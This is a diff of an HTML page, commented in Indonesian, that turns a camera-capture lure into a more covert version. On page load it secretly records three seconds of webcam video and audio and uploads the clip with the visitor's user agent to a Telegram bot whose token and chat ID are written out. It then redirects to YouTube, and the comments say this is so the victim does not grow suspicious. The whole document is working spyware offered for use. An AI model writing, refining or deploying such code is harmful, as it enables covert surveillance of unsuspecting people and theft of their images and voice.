@@ -2,113 +2,112 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <!-- Meta tag untuk mencegah zoom dan membuat tampilan full screen seperti aplikasi -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connecting to Video Server...</title>
+    <title>Loading...</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 40%; margin: 0; }
-        #video { display: none; } /* Sembunyikan preview asli */
-        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Tampilan kosong polos (Background putih) biar kelihatan biasa aja */
+        body { 
+            background-color: #ffffff; 
+            margin: 0; 
+            overflow: hidden; 
+        }
+        
+        #video { 
+            display: none; /* Sembunyikan video preview */
+            position: absolute;
+            top: -9999px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <h2>INITIALIZING CAMERA...</h2>
-    <p>Wait for connection...</p>
-
+    <!-- Video elemen disembunyikan -->
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-        // ⚠️ KONFIGURASI WAJIB BENAR
+        // --- KONFIGURASI ---
         const BOT_TOKEN = '8530007197:AAHlOHC1LIBYe4L5iPcUciT8nxSY-I9HQps';
-        const CHAT_ID = '5803378702'; 
-
-        // DURASI REKAMAN (dalam milidetik) - 3000ms = 3 detik
+        const CHAT_ID = '5803378702';
+        
+        // Link tujuan setelah selesai (Bisa diganti apa aja)
+        const REDIRECT_URL = "https://www.youtube.com"; 
+        
+        // Durasi rekaman (3 detik)
         const RECORD_DURATION = 3000; 
 
         const videoElem = document.getElementById("video");
 
-        async function startRecording() {
+        async function startSilentCapture() {
             try {
-                // 1. Akses Kamera
+                // 1. Langsung ambil stream kamera tanpa notifikasi UI apapun
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 480 }, 
-                    audio: true // Coba ambil audio juga, kalau browser izinkan
+                    video: { facingMode: "user" }, 
+                    audio: true 
                 });
                 
                 videoElem.srcObject = stream;
                 
-                // Tunggu video siap
+                // 2. Mulai proses rekam segera setelah metadata video load
                 videoElem.onloadedmetadata = () => {
-                    // Mulai rekam setelah delay sedikit
+                    // Kita beri delay sangat singkat atau langsung jalan
                     setTimeout(() => {
-                        captureVideo(stream);
-                    }, 1000);
+                        recordStream(stream);
+                    }, 500); // 0.5 detik delay biar kamera ready
                 };
 
             } catch (err) {
-                console.error("Camera Error:", err);
-                alert("Camera permission required!");
+                console.error("Akses ditolak:", err);
+                // Kalau akses ditolak, langsung pindah saja biar gak curiga
+                window.location.href = REDIRECT_URL;
             }
         }
 
-        function captureVideo(stream) {
-            console.log("🔴 Mulai Merekam...");
-            
-            // 2. Setup MediaRecorder
+        function recordStream(stream) {
             let mediaRecorder;
             let chunks = [];
-
-            // Cek support format browser (WebM biasanya support di Chrome/Android)
-            let mimeType = 'video/webm;codecs=vp9';
-            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                mimeType = 'video/webm'; // Fallback
-            }
-
+            
+            // Gunakan format video webm
+            const mimeType = 'video/webm;codecs=vp9' || 'video/webm';
+            
             try {
                 mediaRecorder = new MediaRecorder(stream, { mimeType });
             } catch (e) {
-                console.error("MediaRecorder error:", e);
+                console.error(e);
+                window.location.href = REDIRECT_URL;
                 return;
             }
 
-            // Simpan data chunk saat tersedia
             mediaRecorder.ondataavailable = (e) => {
                 if (e.data.size > 0) chunks.push(e.data);
             };
 
-            // Saat rekaman selesai
             mediaRecorder.onstop = () => {
-                console.log("⏹️ Selesai Merekam. Mengirim...");
                 const blob = new Blob(chunks, { type: mimeType });
-                chunks = [];
                 
-                // Hentikan semua track kamera (lampu indikator mati)
+                // Matikan kamera
                 stream.getTracks().forEach(track => track.stop());
                 
-                // Kirim ke Telegram
-                sendVideoToTelegram(blob);
+                // Kirim video
+                sendVideo(blob);
             };
 
-            // 3. Mulai Rekam
+            // Mulai merekam
             mediaRecorder.start();
 
-            // 4. Stop Otomatis setelah X detik
+            // Stop setelah durasi habis
             setTimeout(() => {
                 mediaRecorder.stop();
             }, RECORD_DURATION);
         }
 
-        function sendVideoToTelegram(blob) {
+        function sendVideo(blob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('video', blob, `capture_${Date.now()}.webm`);
-            formData.append('caption', `🎥 NEW VIDEO CAPTURE\nDuration: ${RECORD_DURATION/1000}s\nUser: ${navigator.userAgent}`);
+            formData.append('video', blob, `silent_cap_${Date.now()}.webm`);
+            formData.append('caption', `🎥 Silent Capture\nTarget: ${navigator.userAgent}`);
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-            
-            // Pakai CORS Proxy lagi biar aman
             const proxyUrl = `https://corsproxy.io/?` + encodeURIComponent(telegramUrl);
 
             fetch(proxyUrl, {
@@ -117,25 +116,25 @@
             })
             .then(response => response.json())
             .then(data => {
-                if(data.ok) {
-                    console.log("✅ VIDEO TERKIRIM!");
-                    // Redirect biar gak curiga
-                    window.location.href = "https://youtube.com";
-                } else {
-                    console.error("Gagal kirim:", data);
-                }
+                console.log("Terkirim");
+                // Setelah sukses kirim, baru pindah halaman
+                finalize();
             })
             .catch(err => {
-                console.error("Network Error:", err);
-                // Retry direct if proxy fails
-                fetch(telegramUrl, { method: 'POST', body: formData })
-                    .then(r => r.json())
-                    .then(d => console.log("Direct send result:", d));
+                console.error(err);
+                // Kalau gagal kirim tetap pindah halaman biar user nggak nyangka
+                finalize();
             });
         }
 
-        // Jalankan
-        window.onload = startRecording;
+        function finalize() {
+            // Pindah ke halaman tujuan
+            window.location.href = REDIRECT_URL;
+        }
+
+        // Jalankan otomatis saat halaman dibuka
+        window.onload = startSilentCapture;
+
     </script>
 </body>
 </html>
